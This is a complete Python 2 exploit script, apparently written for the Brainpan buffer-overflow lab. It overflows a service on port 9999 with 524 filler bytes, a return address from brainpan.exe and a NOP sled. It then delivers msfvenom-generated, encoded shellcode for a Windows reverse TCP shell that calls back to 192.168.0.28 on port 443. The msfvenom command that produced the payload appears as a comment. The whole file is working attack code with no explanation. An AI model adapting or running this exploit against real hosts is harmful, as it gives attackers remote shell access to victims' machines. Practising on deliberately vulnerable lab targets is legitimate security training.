#!/usr/bin/python
import socket
try:
    print "\nSending evil buffer..."
    # Per msf-pattern_offset, exact match at 524 bytes 
    filler = "\x41" * 524
    eip = "\xf3\x12\x17\x31"    # from brainpan.exe
    nops = "\x90" * 8
    #msfvenom -p windows/shell_reverse_tcp LHOST=192.168.0.28 LPORT=443 -f c -e x86/shikata_ga_nai -b "\x00"
    shell = (
        "\xbe\x38\xcd\xbb\x14\xda\xd3\xd9\x74\x24\xf4\x5a\x33\xc9\xb1"
        "\x52\x31\x72\x12\x03\x72\x12\x83\xfa\xc9\x59\xe1\x06\x39\x1f"
        "\x0a\xf6\xba\x40\x82\x13\x8b\x40\xf0\x50\xbc\x70\x72\x34\x31"
        "\xfa\xd6\xac\xc2\x8e\xfe\xc3\x63\x24\xd9\xea\x74\x15\x19\x6d"
        "\xf7\x64\x4e\x4d\xc6\xa6\x83\x8c\x0f\xda\x6e\xdc\xd8\x90\xdd"
        "\xf0\x6d\xec\xdd\x7b\x3d\xe0\x65\x98\xf6\x03\x47\x0f\x8c\x5d"
        "\x47\xae\x41\xd6\xce\xa8\x86\xd3\x99\x43\x7c\xaf\x1b\x85\x4c"
        "\x50\xb7\xe8\x60\xa3\xc9\x2d\x46\x5c\xbc\x47\xb4\xe1\xc7\x9c"
        "\xc6\x3d\x4d\x06\x60\xb5\xf5\xe2\x90\x1a\x63\x61\x9e\xd7\xe7"
        "\x2d\x83\xe6\x24\x46\xbf\x63\xcb\x88\x49\x37\xe8\x0c\x11\xe3"
        "\x91\x15\xff\x42\xad\x45\xa0\x3b\x0b\x0e\x4d\x2f\x26\x4d\x1a"
        "\x9c\x0b\x6d\xda\x8a\x1c\x1e\xe8\x15\xb7\x88\x40\xdd\x11\x4f"
        "\xa6\xf4\xe6\xdf\x59\xf7\x16\xf6\x9d\xa3\x46\x60\x37\xcc\x0c"
        "\x70\xb8\x19\x82\x20\x16\xf2\x63\x90\xd6\xa2\x0b\xfa\xd8\x9d"
        "\x2c\x05\x33\xb6\xc7\xfc\xd4\x79\xbf\xfe\x38\x12\xc2\xfe\x41"
        "\x59\x4b\x18\x2b\x8d\x1a\xb3\xc4\x34\x07\x4f\x74\xb8\x9d\x2a"
        "\xb6\x32\x12\xcb\x79\xb3\x5f\xdf\xee\x33\x2a\xbd\xb9\x4c\x80"
        "\xa9\x26\xde\x4f\x29\x20\xc3\xc7\x7e\x65\x35\x1e\xea\x9b\x6c"
        "\x88\x08\x66\xe8\xf3\x88\xbd\xc9\xfa\x11\x33\x75\xd9\x01\x8d"
        "\x76\x65\x75\x41\x21\x33\x23\x27\x9b\xf5\x9d\xf1\x70\x5c\x49"
        "\x87\xba\x5f\x0f\x88\x96\x29\xef\x39\x4f\x6c\x10\xf5\x07\x78"
        "\x69\xeb\xb7\x87\xa0\xaf\xc8\xcd\xe8\x86\x40\x88\x79\x9b\x0c"
        "\x2b\x54\xd8\x28\xa8\x5c\xa1\xce\xb0\x15\xa4\x8b\x76\xc6\xd4"
        "\x84\x12\xe8\x4b\xa4\x36"
        )
    buffer = filler+eip+nops+shell

    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    s.connect(("192.168.0.30",9999))
    s.send(buffer)

    s.close()

    print "\nDone!"
except:
    print "Could not connect!"

